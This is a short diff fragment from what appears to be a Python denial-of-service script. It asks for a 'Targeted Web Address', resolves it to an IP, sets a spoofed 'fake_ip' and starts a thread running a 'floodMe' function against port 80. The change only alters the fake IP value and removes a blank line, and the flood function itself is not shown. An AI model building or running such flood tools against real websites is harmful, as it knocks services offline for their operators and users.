@@ -41,9 +41,8 @@ if __name__ == "__main__":
 		target1 = input("Targeted Web Address: ")											# Input website
 		target = socket.gethostbyname(target1)												# Grabing IP
 		port = 80
-		fake_ip = '182.21.20.32'											
+		fake_ip = '192.21.20.32'											
 		already_terminated = 0	
-
 		thread = threading.Thread(target=floodMe(target, port))							# Function calling to flood
 		thread.start()
 
